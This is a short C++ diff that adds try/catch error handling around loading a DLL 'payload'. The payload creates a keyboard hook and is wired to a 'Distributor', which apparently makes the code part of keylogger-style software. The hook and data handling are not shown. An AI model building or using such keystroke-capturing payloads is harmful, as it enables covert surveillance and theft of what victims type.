@@ -25,11 +25,19 @@ void Application::init(void)
 		_distributor = std::make_shared<Distributor>();
 		_distributor->init();
 
-		_dllLoader.load(StaticTools::GetDLLPath().c_str());
-		_payload = _dllLoader.getInstance();
-		_payload->setApplicationPath(_appliPath);
-		_payload->setDistributor(_distributor);
-		_payload->createKeyboardHook();
+		try {
+			_dllLoader.load(StaticTools::GetDLLPath());
+			_payload = _dllLoader.getInstance();
+			if (!_payload) {
+				throw (std::runtime_error("Error: can't get payload instance"));
+			}
+			_payload->setApplicationPath(_appliPath);
+			_payload->setDistributor(_distributor);
+			_payload->createKeyboardHook();
+		}
+		catch (std::exception const& e) {
+			throw (std::runtime_error(e.what()));
+		}
 	}
 	catch (std::exception const& e) {
 		throw (e);
